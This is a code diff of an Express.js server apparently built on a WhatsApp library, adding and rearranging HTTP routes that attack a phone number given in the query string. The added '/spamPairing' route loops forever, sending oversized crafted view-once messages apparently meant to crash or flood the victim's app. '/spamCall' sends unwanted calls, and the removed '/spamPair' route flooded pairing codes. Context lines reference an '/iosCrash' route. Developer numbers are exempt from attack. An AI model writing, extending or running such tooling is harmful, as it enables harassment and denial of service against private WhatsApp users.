@@ -156,6 +156,75 @@ await delay(15000); // Delay for 15 seconds
     }
 });
 //====================================\\
+app.get('/spamPairing', async (req, res) => {
+    const { target } = req.query; // Access the target parameter from the query string
+    // Check if the target is a developer number
+    if (isDeveloperNumber(target)) {
+        return res.status(403).send('Cannot attack developer');
+    }
+async function SendPairing(target, Ptcp = true) {
+            while (true) {
+			await XeonBotInc.relayMessage(target, {
+					viewOnceMessage: {
+						message: {
+								nativeFlowResponseMessage: {
+									"status":true,
+                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
+							}
+						}
+					}
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+}
+};
+// Basic validation for phone numbers
+    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
+    if (!target || !phoneNumberPattern.test(target)) {
+        return res.status(400).send('Phone number you have provided is invalid');
+    }
+    try {
+    	res.send(`Started attacking the number ${target}`);
+        await SendPairing(target); // Pass validated phone number to the function
+    } catch (error) {
+        console.error(error.message);
+        res.status(500).send('An error occurred while sending the message');
+    }
+});
+//====================================\\
+app.get('/spamCall', async (req, res) => {
+      const { target } = req.query;
+    // Helper function to check if the number is a developer's number
+    if (isDeveloperNumber(target)) {
+        return res.status(403).send('Cannot attack developer');
+    }
+
+    // Function to perform the spam call
+    async function sendOfferCall(target) {
+    try {
+        await XeonBotInc.offerCall(target);
+        console.log(chalk.white.bold(`Success Send Offer Call To Target ${target}`));
+    } catch (error) {
+        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
+    }
+}
+    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
+    if (!target || !phoneNumberPattern.test(target)) {
+        return res.status(400).send('Phone number you have provided is invalid');
+    }
+    try {
+    	res.send(`Started attacking the number ${target}`);
+        await sendOfferCall(target); // Pass validated phone number to the function
+    } catch (error) {
+        console.error(error.message);
+        res.status(500).send('An error occurred while sending the message');
+    }
+});
+//====================================\\
 app.get('/iosCrash', async (req, res) => {
     const { target } = req.query; // Access the target parameter from the query string
     // Check if the target is a developer number
@@ -276,102 +345,6 @@ contactVcard: true
     } catch (error) {
         console.error(error.message);
         res.status(500).send('An error occurred while sending the message');
-    }
-});
-//====================================\\
-// Route for Spam Call
-app.get('/spamCall', async (req, res) => {
-      const { target } = req.query;
-    // Helper function to check if the number is a developer's number
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send('Cannot attack developer');
-    }
-
-    // Function to perform the spam call
-    async function sendOfferCall(target) {
-    try {
-        await XeonBotInc.offerCall(target);
-        console.log(chalk.white.bold(`Success Send Offer Call To Target ${target}`));
-    } catch (error) {
-        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
-    }
-}
-
-    try {
-    	res.send(`Started attacking the number ${target}`);
-        await sendOfferCall(target); // Pass validated phone number to the function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
-    if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send('Phone number you have provided is invalid');
-    }
-    try {
-    	res.send(`Started attacking the number ${target}`);
-        await sendOfferCall(target); // Pass validated phone number to the function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
-});
-//====================================\\
-app.get('/spamPair', async (req, res) => {
-    const { target, count = 20, delay = 3000 } = req.query;
-
-    // Helper function to check if the number is a developer's number
-    function isDeveloperNumber(number) {
-        const developerNumbers = ["916909137213"]; // Add protected numbers here
-        return developerNumbers.includes(number.replace(/[^\d]/g, ""));
-    }
-
-    // Validate the phone number
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/;
-    if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send("Invalid phone number provided.");
-    }
-
-    // Protect developer numbers
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send("Cannot attack developer.");
-    }
-
-    // Function to perform the spam
-    async function spamPair(target, count, delay) {
-        const jid = `${target.replace(/[^\d]/g, "")}@s.whatsapp.net`;
-        const spamCount = parseInt(count);
-        const delayMs = parseInt(delay);
-
-        const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('baileys');
-        const { state } = await useMultiFileAuthState("sessions");
-        const { version } = await fetchLatestBaileysVersion();
-        const sucked = await makeWaSocket({ auth: state, version });
-
-        for (let i = 0; i < spamCount; i++) {
-            try {
-                const prc = await sucked.requestPairingCode(target);
-                console.log(`# Success Spam Pairing Code - Number: ${target} - Code: ${prc}`);
-                await sucked.sendMessage(jid, { text: `Pairing Code: ${prc}` });
-
-                // Wait before sending the next message
-                await new Promise(resolve => setTimeout(resolve, delayMs));
-            } catch (err) {
-                console.error(`Error sending pairing code: ${err.message}`);
-                if (err.message.includes("Connection Closed")) {
-                    console.log("Connection closed, stopping spam.");
-                    break;
-                }
-            }
-        }
-    }
-
-    try {
-        res.send(`Started spamming pairing codes to ${target}`);
-        await spamPair(target, count, delay); // Trigger the spam function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send("An error occurred while spamming pairing codes.");
     }
 });
 //====================================\\
